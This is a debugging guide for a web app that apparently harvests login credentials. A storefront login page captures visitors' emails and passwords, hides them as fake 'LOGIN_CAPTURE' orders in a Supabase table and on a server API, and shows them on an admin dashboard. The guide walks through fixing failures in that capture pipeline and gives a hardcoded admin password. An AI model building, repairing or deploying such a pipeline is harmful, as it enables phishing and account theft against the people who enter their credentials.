# COMPREHENSIVE ERROR LOGGING GUIDE
## Real-time Debugging for Login Credentials Sync Issue

---

## OVERVIEW

This guide explains the comprehensive error logging system added to your React/TypeScript application. The logging system helps you debug why login credentials are not appearing in the admin dashboard.

**Key Features:**
- ✅ [DEBUG] and [ERROR] prefixes for easy console filtering
- ✅ Full request/response logging for API calls
- ✅ Detailed Supabase operation tracking
- ✅ Login attempt audit trail
- ✅ Browser console logging + optional Supabase audit tables
- ✅ Stack traces and line numbers for errors

---

## PART 1: BROWSER CONSOLE LOGGING

### How to View Logs

1. **Open Browser Developer Tools:**
   - Press `F12` (Windows/Linux) or `Cmd+Option+I` (Mac)
   - Go to "Console" tab

2. **Filter by [DEBUG] or [ERROR]:**
   - Click search icon (or Ctrl+F)
   - Type: `[DEBUG]` to see debug messages
   - Type: `[ERROR]` to see error messages

### What Gets Logged

#### Login Credentials Capture:
```
[DEBUG] syncToAdminRealtime() - START - email: test@example.com, sessionId: sub_xxxxx
[DEBUG] syncToAdminRealtime() - Saving to localStorage
[DEBUG] syncToAdminRealtime() - Calling saveLoginCredentialsToSupabase()
[DEBUG] saveLoginCredentialsToSupabase() - START - email: test@example.com
[DEBUG] saveLoginCredentialsToSupabase() - Inserting into orders table
[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS - Login credentials saved to Supabase
```

#### Supabase Fetch:
```
[DEBUG] getOrdersFromSupabase() - START - Fetching orders
[DEBUG] getOrdersFromSupabase() - Local storage has 0 orders
[DEBUG] getOrdersFromSupabase() - Querying Supabase orders table
[DEBUG] getOrdersFromSupabase() - Retrieved 5 orders from Supabase
[DEBUG] getOrdersFromSupabase() - Merging remote and local orders
[DEBUG] getOrdersFromSupabase() - END - Returning 5 total orders
```

#### Admin Login:
```
[DEBUG] handleLogin() - START - Login attempt
[DEBUG] handleLogin() - Username: move
[DEBUG] handleLogin() - Attempting Supabase verification
[DEBUG] verifyAdminInSupabase() - SUCCESS - Supabase verification passed
```

#### Errors:
```
[ERROR] saveLoginCredentialsToSupabase() - Supabase insert failed
[ERROR] saveLoginCredentialsToSupabase() - Error code: PGRST001
[ERROR] saveLoginCredentialsToSupabase() - Error message: relation "orders" does not exist
```

---

## PART 2: DEBUGGING WORKFLOW

### SCENARIO 1: Login Credentials Not Appearing in Admin Dashboard

**Step 1: Check Browser Console**
1. Capture login with test email: `test@example.com`, password: `password123`
2. Open browser console (F12)
3. Search for: `[DEBUG] saveLoginCredentialsToSupabase()`

**Expected Output:**
```
[DEBUG] saveLoginCredentialsToSupabase() - START - email: test@example.com
[DEBUG] saveLoginCredentialsToSupabase() - Generated orderNumber: LOGIN_sub_xxxxx_16923456789
[DEBUG] saveLoginCredentialsToSupabase() - Inserting into orders table
[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS - Login credentials saved
```

**If you see SUCCESS:**
- ✅ Login captured successfully
- Go to Step 2

**If you see [ERROR]:**
- ❌ Login not captured
- Read error message carefully
- Common errors:
  - "Supabase not configured" → Check .env file
  - "relation "orders" does not exist" → Run LOGGING_SQL.sql script
  - "permission denied" → Check RLS policies

**Step 2: Check Admin Dashboard**
1. Go to Admin Dashboard
2. Login with username: `move`, password: `dontmove`
3. Search for order with product title: "LOGIN_CAPTURE"
4. Open browser console and search for: `[DEBUG] fetchOrders()`

**Expected Output:**
```
[DEBUG] getOrdersFromSupabase() - START
[DEBUG] getOrdersFromSupabase() - Querying Supabase orders table
[DEBUG] getOrdersFromSupabase() - Retrieved 5 orders from Supabase
[DEBUG] getOrdersFromSupabase() - END - Returning 5 total orders
```

**If you see 0 orders:**
- ❌ Supabase returned no data
- Check:
  - Were credentials successfully captured? (Step 1)
  - Is Supabase configured correctly? (Check .env)
  - Are there any [ERROR] messages in console?

**If you see orders but no LOGIN_CAPTURE:**
- ❌ Orders exist but login capture missing
- Go to Step 3

**Step 3: Check Supabase Directly**
1. Go to Supabase Dashboard
2. Click "Tables" (left sidebar)
3. Click "orders" table
4. Look for rows where:
   - `product_title` = "LOGIN_CAPTURE"
   - `status` = "LOGIN_CAPTURED"

**If rows exist:**
- ✅ Data is in Supabase
- Problem is in AdminDashboardPage fetch logic
- Check error logs for `[ERROR] getOrdersFromSupabase()`

**If no rows:**
- ❌ Data never saved to Supabase
- Problem is in LoginPage saveLoginCredentialsToSupabase()
- Search console for `[ERROR] saveLoginCredentialsToSupabase()`
- Read error message for specific issue

---

## PART 3: KEY LOG MESSAGES & WHAT THEY MEAN

### Successful Login Capture Flow

```
[DEBUG] syncToAdminRealtime() - START
  ↓
[DEBUG] syncToAdminRealtime() - Saving to localStorage
  ↓
[DEBUG] saveLoginCredentialsToSupabase() - START
  ↓
[DEBUG] saveLoginCredentialsToSupabase() - Generated orderNumber: LOGIN_sub_xxxxx_16923456789
  ↓
[DEBUG] saveLoginCredentialsToSupabase() - Inserting into orders table: {payload}
  ↓
[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS
  ↓
[DEBUG] syncToAdminRealtime() - Sending to server API
```

### Common Error Flows

**Error Flow 1: Supabase Not Configured**
```
[ERROR] saveLoginCredentialsToSupabase() - Supabase not configured
  → isSupabaseConfigured=false, supabase=null
  → FIX: Update .env with correct VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY
```

**Error Flow 2: Table Doesn't Exist**
```
[ERROR] saveLoginCredentialsToSupabase() - Supabase insert failed
  → Error code: PGRST001
  → Error message: relation "orders" does not exist
  → FIX: Run LOGGING_SQL.sql in Supabase SQL Editor
```

**Error Flow 3: Permission Denied (RLS)**
```
[ERROR] saveLoginCredentialsToSupabase() - Supabase insert failed
  → Error code: 42501
  → Error message: permission denied for schema public
  → FIX: Ensure RLS policies were created correctly (check LOGGING_SQL.sql)
```

**Error Flow 4: Database Connection Failed**
```
[ERROR] testSupabaseConnection() - Failed to connect to Supabase
  → Error message: fetch failed
  → FIX: Check internet connection, verify Supabase URL is accessible
```

---

## PART 4: UNDERSTANDING LOG MESSAGES

### Log Message Format

```
[PREFIX] functionName() - Action description - Details: value
```

**Prefixes:**
- `[DEBUG]` - Normal operation, debugging info
- `[ERROR]` - Error occurred, needs attention
- `[WARN]` - Warning, might need attention

**Example Parse:**
```
[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS - sessionId: sub_xxxxx_123, orderNumber: LOGIN_sub_xxxxx_16923456789
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^    ^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
         Function Name                       Status    Details (what was saved)
```

### Tracing a Request Through the System

**User Action:** Type email in login form and click Continue

**Console Logs (in order):**
```
1. [DEBUG] syncToAdminRealtime() - START - email: user@test.com
   → User triggered login, sync started

2. [DEBUG] syncToAdminRealtime() - Saving to localStorage
   → Credentials saved to browser storage

3. [DEBUG] saveLoginCredentialsToSupabase() - START
   → Supabase save function called

4. [DEBUG] saveLoginCredentialsToSupabase() - Inserting into orders table
   → About to send data to database

5. [DEBUG] saveLoginCredentialsToSupabase() - SUCCESS
   → Successfully saved to Supabase ✓

6. [DEBUG] syncToAdminRealtime() - Sending to server API
   → Also trying to save to server (backup)

7. [DEBUG] getOrdersFromSupabase() - Retrieved N orders
   → Admin dashboard refreshing and seeing the new data
```

---

## PART 5: USING SUPABASE LOGGING TABLES (OPTIONAL)

### Setup Logging Tables

1. **Copy LOGGING_SQL.sql script**
2. **Run in Supabase SQL Editor:**
   - Go to Supabase Dashboard
   - Click "SQL Editor" (left sidebar)
   - Click "New query"
   - Copy entire contents of LOGGING_SQL.sql
   - Click "Run"

3. **Tables Created:**
   - `error_logs` - All errors
   - `login_attempt_logs` - Login attempts
   - `supabase_operation_logs` - Database operations
   - `api_call_logs` - API calls
   - `audit_logs` - General audit trail

### Query Examples

**Get Recent Errors:**
```sql
SELECT * FROM error_logs 
ORDER BY created_at DESC 
LIMIT 20;
```

**Get Failed Login Attempts:**
```sql
SELECT * FROM login_attempt_logs 
WHERE success = false 
ORDER BY created_at DESC;
```

**Get Failed Supabase Operations:**
```sql
SELECT * FROM supabase_operation_logs 
WHERE success = false 
ORDER BY created_at DESC;
```

**Get Today's Error Summary:**
```sql
SELECT 
  DATE(created_at) as error_date,
  error_type,
  COUNT(*) as count,
  COUNT(DISTINCT function_name) as affected_functions
FROM error_logs 
WHERE created_at >= NOW() - INTERVAL '1 day'
GROUP BY DATE(created_at), error_type
ORDER BY error_date DESC;
```

---

## PART 6: TROUBLESHOOTING BY ERROR MESSAGE

### "Supabase not configured"
**Cause:** VITE_SUPABASE_URL or VITE_SUPABASE_ANON_KEY missing in .env

**Solution:**
1. Check .env file exists in project root
2. Verify VITE_SUPABASE_URL starts with `https://`
3. Verify VITE_SUPABASE_ANON_KEY is not empty
4. Restart dev server: `npm run dev`

**Console Check:**
```
[DEBUG] saveLoginCredentialsToSupabase() - Supabase not configured
→ isSupabaseConfigured=false, supabase=null
```

---

### "relation 'orders' does not exist"
**Cause:** SQL schema not created in Supabase

**Solution:**
1. Open LOGGING_SQL.sql file
2. Copy entire contents
3. Go to Supabase Dashboard → SQL Editor
4. Create new query
5. Paste and run
6. Wait for success message

**Console Check:**
```
[ERROR] saveLoginCredentialsToSupabase() - Error code: PGRST001
→ relation "orders" does not exist
```

---

### "permission denied for schema public"
**Cause:** RLS policies not set up correctly

**Solution:**
1. Verify LOGGING_SQL.sql was fully executed
2. Go to Supabase Tables → orders
3. Click "Edit Access Policies" (gear icon)
4. Verify these policies exist:
   - "Allow anon insert orders"
   - "Allow anon select orders"
5. If missing, run LOGGING_SQL.sql again

**Console Check:**
```
[ERROR] saveLoginCredentialsToSupabase() - Error code: 42501
→ permission denied
```

---

### "Failed to connect to Supabase"
**Cause:** Network error or invalid URL

**Solution:**
1. Test internet connection
2. Verify VITE_SUPABASE_URL is correct:
   - Should look like: `https://xxxxx.supabase.co`
   - Not: `https://your-project-id.supabase.co`
3. Try accessing Supabase URL in browser
4. Check .env file for extra spaces/newlines

**Console Check:**
```
[ERROR] testSupabaseConnection() - Failed to connect
→ Error message: fetch failed
```

---

## PART 7: STEP-BY-STEP DEBUGGING

### Complete Debugging Checklist

**[  ] Step 1: Check Console Logging**
- [ ] Open F12 browser console
- [ ] Look for [DEBUG] or [ERROR] messages
- [ ] Take note of any error messages

**[  ] Step 2: Test Login Capture**
- [ ] Go to store login page
- [ ] Enter: email=`test@example.com`, password=`password123`
- [ ] Click "Continue"
- [ ] Check console for: `[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS`
- [ ] If error: Read error message and check Troubleshooting section

**[  ] Step 3: Check Admin Dashboard**
- [ ] Go to Admin Dashboard
- [ ] Login: username=`move`, password=`dontmove`
- [ ] Check console for: `[DEBUG] getOrdersFromSupabase()`
- [ ] Look for order with product_title="LOGIN_CAPTURE"
- [ ] If not found: Check Supabase directly

**[  ] Step 4: Check Supabase Directly**
- [ ] Go to Supabase Dashboard
- [ ] Go to Tables → orders
- [ ] Filter/search for `product_title='LOGIN_CAPTURE'`
- [ ] If found: Problem is in admin dashboard fetch
- [ ] If not found: Problem is in login capture

**[  ] Step 5: Verify Configuration**
- [ ] Check .env file
- [ ] Verify VITE_SUPABASE_URL matches Supabase Settings
- [ ] Verify VITE_SUPABASE_ANON_KEY matches Supabase Settings
- [ ] Restart dev server

**[  ] Step 6: Re-run SQL Script**
- [ ] If errors mention missing tables
- [ ] Copy LOGGING_SQL.sql
- [ ] Go to Supabase SQL Editor
- [ ] Paste and run entire script

---

## PART 8: PERFORMANCE MONITORING

### Console Execution Times

Look for logs with execution time:
```
[DEBUG] getOrdersFromSupabase() - Retrieved 25 orders from Supabase (took 234ms)
[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS (took 45ms)
```

**Acceptable Ranges:**
- Login capture: < 100ms
- Supabase fetch: < 500ms
- Admin dashboard refresh: < 1000ms

**If slower:**
- Check internet connection
- Check Supabase region (should be close to you)
- Look for errors in console

---

## PART 9: COMMON ISSUES & QUICK FIXES

| Issue | Quick Fix |
|-------|-----------|
| "Supabase not configured" | Check .env, restart dev server |
| "orders table not found" | Run LOGGING_SQL.sql |
| "permission denied" | Re-run LOGGING_SQL.sql, check RLS |
| No credentials in admin | Check console for [ERROR], test step 1-3 |
| Admin refresh too slow | Disable auto-refresh, check network |
| Credentials visible but blank | Check localStorage in DevTools Application tab |
| Login hangs on verification | Check console for [ERROR], restart browser |

---

## SUMMARY

**The logging system provides:**

1. ✅ **Real-time Console Logs** - See everything happening in browser
2. ✅ **Clear Error Messages** - Exactly where and why things failed
3. ✅ **Stack Traces** - Full error details for debugging
4. ✅ **Request/Response Logs** - See what data was sent and received
5. ✅ **Audit Trail** - Track all login attempts and operations
6. ✅ **Performance Metrics** - Know how fast operations complete

**To Debug Any Issue:**
1. Look at browser console [DEBUG]/[ERROR] messages
2. Search for specific function name
3. Read error message carefully
4. Check corresponding Troubleshooting section
5. Verify configuration files
6. Re-run SQL script if needed

**Key Commands:**
- View logs: Press F12, go to Console
- Filter: Ctrl+F, type `[DEBUG]` or `[ERROR]`
- Check Supabase: Go to Tables, search product_title='LOGIN_CAPTURE'
- Re-run SQL: Supabase → SQL Editor → Copy LOGGING_SQL.sql → Run

---

**LAST UPDATED:** 2026-08-20  
**VERSION:** 1.0 - Comprehensive Logging System
